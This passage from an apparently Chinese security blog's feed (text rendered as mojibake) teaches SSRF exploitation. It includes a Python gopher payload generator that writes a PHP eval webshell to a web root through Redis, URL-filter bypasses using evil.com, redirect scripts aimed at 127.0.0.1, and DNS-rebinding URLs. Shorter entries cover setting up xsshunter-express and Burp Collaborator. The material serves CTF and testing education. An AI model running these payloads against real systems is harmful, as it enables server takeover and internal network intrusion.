class="comment">#shell</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#æ–‡ä»¶å</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"><span class="comment">#rediså¯†ç </span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[</span><br><span class="line">    <span class="comment">#&quot;auth passwd&quot;,</span></span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="comment">#æœ€åçš„ç»“æœè¦å¯¹&quot;_&quot;åé¢è¿›è¡Œä¸€æ¬¡urlç¼–ç </span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="âš ï¸æ³¨æ„ç‚¹">âš ï¸æ³¨æ„ç‚¹</h3><p>åœ¨ä½¿ç”¨SSRFæ‰“Redisæ—¶ï¼Œå¯¹äº&quot;gopher://127.0.0.1:6379/_&quot;åçš„å†…å®¹éœ€è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç ã€‚</p><h2 id="SSRFçš„ç»•è¿‡">SSRFçš„ç»•è¿‡</h2><p>å­¦ä¹ SSRFä¸èƒ½ä»…ä»…å±€é™äºCTFæ¯”èµ›ä¸­ï¼Œæ›´å¤šçš„æ˜¯è¦è¿ç”¨åœ¨å®é™…çš„ç¯å¢ƒä¸­ã€‚</p><h3 id="ç»•è¿‡URLåŒ¹é…å­—ç¬¦çš„é™åˆ¶">ç»•è¿‡URLåŒ¹é…å­—ç¬¦çš„é™åˆ¶</h3><p><strong>åç«¯å¯¹è¯·æ±‚çš„URLè¿›è¡Œå­—ç¬¦åŒ¹é…æ£€æµ‹ã€‚</strong></p><p>ä¸‹é¢ï¼Œ<code>evil.com</code>ä¸ºæ¶æ„çš„åŸŸåï¼Œ<code>target.com</code>ä¸ºæ­£å¸¸çš„ä¸šåŠ¡åŸŸåã€‚</p><p>ä¾‹å¦‚ï¼Œç›´æ¥åˆ¤æ–­URLä¸­æ˜¯å¦åŒ…å«æŸä¸ª<code>target.com</code>ã€‚ä½¿ç”¨@è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com@evil.com</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œä½¿ç”¨å­—ç¬¦ä¸²åŒ¹é…çš„æ–¹å¼ï¼Œåˆ¤æ–­åŸŸåä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå­åŸŸåï¼Œå¦‚å¿…é¡»åŒ…å«<code>qq.com</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com.evil.com</span><br></pre></td></tr></table></figure><p><strong>è§£æçš„å·®å¼‚ã€‚</strong></p><p>ä¾‹å¦‚ï¼Œå‰åç«¯åˆ†ç¦»ï¼Œå¯¹URLçš„è§£æå·®å¼‚ä¸åŒï¼Œç»•è¿‡æ£€æµ‹ã€‚æœ‰çš„åç«¯ä¼šæŠŠ<code>\.</code>å’Œ<code>\@</code>è§£ææˆ<code>.</code>å’Œ<code>@</code>ï¼Œåˆ™ä¼šè§£æåˆ°<code>evil.com</code>ã€‚è‹¥æŠŠ<code>\</code>è§£æä¸º<code>/</code>ï¼Œåˆ™ä¸å­˜åœ¨é—®é¢˜ï¼Œè¿˜æ˜¯æ­£å¸¸è§£æåˆ°<code>target.com</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target.com\.evil.com</span><br><span class="line">https://target.com\@evil.com</span><br></pre></td></tr></table></figure><h3 id="ç›´æ¥302è·³è½¬">ç›´æ¥302è·³è½¬</h3><p>åˆ©ç”¨302è·³è½¬ï¼Œè·³è½¬åˆ°å†…ç½‘çš„åœ°å€ä¸Šï¼Œå®ç°<code>SSRF</code>ã€‚</p><p>ä½¿ç”¨<code>php</code>ä»£ç å®ç°ï¼Œ<code>302.php</code>å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// è®¾ç½®è·³è½¬ç›®æ ‡å†…ç½‘URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// å‘é€302è·³è½¬å¤´ä¿¡æ¯</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="æœ‰æ¡ä»¶çš„302è·³è½¬">æœ‰æ¡ä»¶çš„302è·³è½¬</h3><p>è¦è€ƒè™‘å®é™…ç¯å¢ƒä¸­æ˜¯å¦æœ‰ç›¸å…³çš„è¿‡æ»¤ã€‚æˆ‘è‡ªå·±æƒ³åˆ°çš„è¿‡æ»¤æœ‰ä»¥ä¸‹å‡ ç§ï¼Œå…·ä½“è¦æ ¹æ®å®é™…æƒ…å†µåˆ†æã€‚</p><h4 id="1-ã€åç«¯éªŒè¯äº†è·³è½¬çš„ç›®æ ‡åŸŸå">(1)ã€åç«¯éªŒè¯äº†è·³è½¬çš„ç›®æ ‡åŸŸå</h4><p>åç«¯ä»£ç éªŒè¯äº†è·³è½¬çš„ç›®æ ‡URLçš„åŸŸåï¼Œæ˜¯å¦ä¸ºç™½åå•ä¸­çš„åŸŸåã€‚ç»•è¿‡è¿™ç§éªŒè¯ï¼Œéœ€è¦æ‰¾åˆ°ç™½åå•åŸŸåä¸­çš„ä¸€ä¸ª302è·³è½¬ï¼Œå³å¯å®ç°ç»•è¿‡ã€‚</p><p>è‡ªå·±çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²<code>r.php</code>ï¼Œå¯¹åº”çš„URLä¸º<code>https://evil.com/r.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// è®¾ç½®è·³è½¬ç›®æ ‡å†…ç½‘URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// å‘é€302è·³è½¬å¤´ä¿¡æ¯</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨302è·³è½¬çš„ç™½åå•åŸŸåï¼Œå¦‚ä¸‹ï¼š</p><p><code>https://vulnerable.com/?redirect_url=</code></p><p>åˆ™è·³è½¬çš„åœ°å€ä¸ºï¼š</p><p><code>https://vulnerable.com/?redirect_url=https%3A%2F%2Fevil.com%2Fr.php</code></p><p><code>vulnerable.com</code>ä¸ºç™½åå•åŸŸåï¼Œç»•è¿‡äº†ç™½åå•çš„é™åˆ¶ã€‚</p><h4 id="2-ã€åç«¯éªŒè¯äº†è¯·æ±‚è¿”å›çš„æ•°æ®åŒ…">(2)ã€åç«¯éªŒè¯äº†è¯·æ±‚è¿”å›çš„æ•°æ®åŒ…</h4><p>åç«¯ä»£ç å¯¹è¯·æ±‚çš„URLçš„è¿”å›ç»“æœè¿›è¡Œäº†éªŒè¯ã€‚è¿”å›çš„å“åº”æ•°æ®åŒ…ä¸­çš„æ¯ä¸€ä¸ªå†…å®¹éƒ½æœ‰å¯èƒ½ä½œä¸ºåç«¯é™åˆ¶çš„æ¡ä»¶ï¼Œè¿™é‡Œç»•è¿‡é™åˆ¶çš„æ–¹æ³•å°±æ˜¯å»æƒ³åŠæ³•æ„é€ ï¼Œæ»¡è¶³åç«¯ä»£ç çš„åˆ¤æ–­æ¡ä»¶ï¼Œç„¶åå†è¿›è¡Œ302çš„è·³è½¬ã€‚</p><p><strong>ä¾‹å¦‚</strong>ï¼Œå³åç«¯éªŒè¯è¯·æ±‚çš„URLè¿”å›çš„çŠ¶æ€ç åªèƒ½æ˜¯ç‰¹å®šçš„ï¼Œå¦‚200ã€‚æ­¤æ—¶è¦åœ¨ä½¿ç”¨dnslogè¿›è¡Œ<code>SSRF</code>æµ‹è¯•çš„æ—¶å€™æ³¨æ„ï¼Œåç«¯ä»£ç å¯¹URLè¿›è¡Œäº†å‡ æ¬¡è¯·æ±‚ï¼Œæœ‰å¯èƒ½çš„æƒ…å†µæ˜¯å…ˆå¯¹URLè¯·æ±‚ä¸€æ¬¡éªŒè¯çŠ¶æ€ç æ˜¯200ï¼Œæ»¡è¶³æ¡ä»¶åï¼Œåç»­å‡ æ¬¡è¯·æ±‚æœªå¯¹è¿”å›å†…å®¹è¿›è¡ŒéªŒè¯ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç¼–å†™ä»£ç ï¼Œè¿›è¡Œè¯·æ±‚æ¬¡æ•°çš„é™å®šï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚è¿”å›200ï¼Œç¬¬næ¬¡è¯·æ±‚è¿”å›302è·³è½¬ï¼Œè·³è½¬åˆ°å†…ç½‘çš„åœ°å€ä¸­ã€‚</p><p>ä½¿ç”¨<code>nodejs</code>å®ç°<code>ssrf.js</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> requestCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/1&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    requestCount++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> personalInfo = &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;å¼ ä¸‰&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;zhangsan@example.com&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•è®¿é—®æ—¥å¿—</span></span><br><span class="line">    <span class="keyword">const</span> logMessage = &#123;</span><br><span class="line">        <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(),</span><br><span class="line">        <span class="attr">requestCount</span>: requestCount,</span><br><span class="line">        <span class="attr">method</span>: req.<span class="property">method</span>,</span><br><span class="line">        <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">        <span class="attr">query</span>: req.<span class="property">query</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è®¿é—®æ—¥å¿—:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(logMessage, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="comment">//è¯·æ±‚çš„æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (requestCount &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// è¿”å›çŠ¶æ€ 200 å’Œä¸ªäººä¿¡æ¯çš„ JSON æ•°æ®</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(personalInfo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ç¬¬ 5 æ¬¡è®¿é—®ï¼Œè¿”å›çŠ¶æ€ 302 è·³è½¬åˆ°ç™¾åº¦</span></span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&#x27;http://127.0.0.1/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æœåŠ¡å™¨æ­£åœ¨è¿è¡Œï¼Œè®¿é—® http://localhost:<span class="subst">$&#123;PORT&#125;</span>/1`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¯·æ±‚ç¬¬1æ¬¡ï¼Œè¿”å›æ­£å¸¸çš„ä¸ªäººä¿¡æ¯å†…å®¹ï¼Œè¯·æ±‚ç¬¬2æ¬¡ï¼Œåˆ™è¿›è¡Œ302è·³è½¬ï¼Œè·³è½¬åˆ°å†…ç½‘ä¸­ã€‚</p><p><strong>ä¾‹å¦‚</strong>ï¼Œåç«¯ä»£ç éªŒè¯çš„è¯·æ±‚çš„URLåªèƒ½æ˜¯ç‰¹å®šçš„<code>User-Agent</code>å¤´ã€‚</p><p>ä½¿ç”¨<code>php</code>å®ç°<code>1.php</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// è·å–è¯·æ±‚çš„ User-Agent</span></span><br><span class="line">    <span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// æ£€æŸ¥ User-Agent æ˜¯å¦åŒ…å« okhttp/3.12.1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$userAgent</span>, <span class="string">&#x27;okhttp/3.12.1&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: https://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(); <span class="comment">// ç¡®ä¿åœæ­¢è„šæœ¬æ‰§è¡Œ</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®è·³è½¬ç›®æ ‡URL</span></span><br><span class="line">    <span class="variable">$target_url</span> = <span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å†…ç½‘htmlæ¸²æŸ“">å†…ç½‘htmlæ¸²æŸ“</h3><p>åç«¯ä»£ç åœ¨å¤„ç†å‰ç«¯ä¼ è¾“çš„<code>html</code>å†…å®¹æ—¶ï¼Œä¼šå¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œæ¸²æŸ“ï¼Œä¾‹å¦‚ï¼Œæ–‡æœ¬è½¬æ¢ä¸ºPDFã€åœ¨çº¿ç®€å†ç”Ÿæˆç­‰å¯èƒ½å­˜åœ¨<code>html</code>æ¸²æŸ“çš„åŠŸèƒ½ç‚¹ã€‚</p><h4 id="1-ã€ä½¿ç”¨iframeæ ‡ç­¾ç›´æ¥è¯»å–å†…ç½‘">(1)ã€ä½¿ç”¨iframeæ ‡ç­¾ç›´æ¥è¯»å–å†…ç½‘</h4><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;10000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-ã€ä½¿ç”¨æ ‡ç­¾è·³è½¬å†…ç½‘">(2)ã€ä½¿ç”¨æ ‡ç­¾è·³è½¬å†…ç½‘</h4><p><code>&lt;meta&gt;</code>å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾è¿›è¡Œè·³è½¬ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=http://127.0.0.1/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-ã€ä½¿ç”¨æ ‡ç­¾å¼•å…¥å†…ç½‘">(3)ã€ä½¿ç”¨æ ‡ç­¾å¼•å…¥å†…ç½‘</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-rebinding">DNS rebinding</h3><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p>åœ¨è¯·æ±‚æ—¶æ³¨æ„<code>CDN</code>ç¼“å­˜çš„é—®é¢˜ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹è¯·æ±‚çš„urlã€‚</p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?11">http://7f000001.c0a80001.rbndr.us/flag.html?11</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?22">http://7f000001.c0a80001.rbndr.us/flag.html?22</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?33">http://7f000001.c0a80001.rbndr.us/flag.html?33</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> gopheråè®® </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsshunter-expressæ­å»º</title>
      <link href="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒï¼š<a href="https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s">https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s</a></p><h4 id="åŸŸåé…ç½®">åŸŸåé…ç½®</h4><p>é¦–å…ˆé…ç½®ä¸€ä¸‹è‡ªå·±çš„åŸŸåï¼Œä»¥test.comåŸŸåä¸ºä¾‹ï¼Œå°†xsshunter-expressé…ç½®åˆ°åŸŸåxss.test.comä¸Šã€‚</p><p>***æ³¨æ„ï¼š***æˆ‘çš„æœåŠ¡å™¨ä¸ºè…¾è®¯äº‘çš„é¦™æ¸¯æœåŠ¡å™¨æ— éœ€å¤‡æ¡ˆå¯è®¿é—®ã€‚</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/1.png" alt></p><h4 id="å¼€å§‹å®‰è£…">å¼€å§‹å®‰è£…</h4><p>é¦–å…ˆä¸‹è½½xsshunter-express</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mandatoryprogrammer/xsshunter-express.git</span><br><span class="line">cd xsshunter-express/</span><br></pre></td></tr></table></figure><p>å®‰è£…ä½¿ç”¨çš„æ˜¯dockerç¯å¢ƒï¼Œä¿®æ”¹dockerçš„é…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®ï¼Œå°†versionä¿®æ”¹ä¸º3.3ï¼Œ<a href="http://xn--HOSTNAMExss-o68qo3j09bh62acno8tqo72bkx9d.test.com">å°†HOSTNAMEä¿®æ”¹ä¸ºä½ çš„åŸŸåxss.test.com</a>ã€‚å¦‚æœåªæ˜¯æƒ³è®©xsshunter-expresså¯ä»¥ä½¿ç”¨ï¼Œè¿™æ ·å°±è¡Œäº†ï¼Œéœ€è¦ç™»é™†xss.test.comçœ‹ä¸€ä¸‹xssæ˜¯å¦è§¦å‘ã€‚è¿˜å¯ä»¥é…ç½®é‚®ç®±æ¥æ”¶è‡ªå·±çš„xssè§¦å‘æé†’ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†æ–¹ä¾¿æ²¡æœ‰é…ç½®ï¼Œæƒ³é…ç½®å¯ä»¥å‚è€ƒåŸè§†é¢‘ã€‚</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/2.png" alt></p><p>å¼€å§‹å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d postgresdb</span><br><span class="line">docker-compose up xsshunterexpress</span><br></pre></td></tr></table></figure><p>å®‰è£…æˆåŠŸï¼Œè®°ä¸€ä¸‹å¯†ç ã€‚</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/3.png" alt></p><h4 id="æµ‹è¯•">æµ‹è¯•</h4><p>è®¿é—®<a href="https://xss.test.com/admin/#/%EF%BC%8C%E8%BE%93%E5%85%A5%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E3%80%82">https://xss.test.com/admin/#/ï¼Œè¾“å…¥ä½ çš„å¯†ç å³å¯ç™»å½•ã€‚</a></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/4.png" alt></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/5.png" alt></p><p>åœ¨XSS PAYLOADSæ¨¡å—ï¼Œéšæ„æ‰¾ä¸€ä¸ªpayloadè¿›è¡Œæµ‹è¯•ï¼Œæˆ‘æ˜¯ç”¨çš„<code>&lt;img&gt;</code>çš„æµ‹è¯•æ ‡ç­¾ã€‚</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/6.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­å»ºBurp Collaborator</title>
      <link href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/"/>
      <url>/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/</url>
      
        <content type="html"><![CDATA[<h2 id="è¦æ±‚">è¦æ±‚</h2><p>Dockerã€åŸŸåã€BurpSuiteã€æœåŠ¡å™¨Ubuntu 20ï¼ˆå°½é‡é€‰æ‹©é¦™æ¸¯æœåŠ¡å™¨ï¼ŒåŸŸåä¸éœ€è¦å¤‡æ¡ˆå¯è®¿é—®ï¼‰</p><h2 id="è®¾ç½®åŸŸå">è®¾ç½®åŸŸå</h2><p>å»åˆ°è‡ªå·±çš„åŸŸåçš„DNSç®¡ç†å™¨ã€‚è®¾ç½®ä¸€ä¸ªburp collaboratorå­åŸŸåï¼Œå¹¶å°†NSè®°å½•æ·»åŠ åˆ°ä½ çš„burp collaboratorå­åŸŸåï¼Œä¸€ä¸ªAè®°å½•æŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/1.png" alt></p><p>NSè®°å½•çš„åŸŸåä¸ºä½ ä½¿ç”¨çš„BurpSuite CollaboratoråŸŸåã€‚</p><h2 id="ç¯å¢ƒè®¾ç½®">ç¯å¢ƒè®¾ç½®</h2><p>å¦‚æœæ²¡æœ‰dockeréœ€è¦å®‰è£…dockerã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y </span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br></pre></td></tr></table></figure><p>å®‰è£…dockerä»¥åï¼Œç»§ç»­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/integrity-sa/burpcollaborator-docker.git &amp;&amp; cd 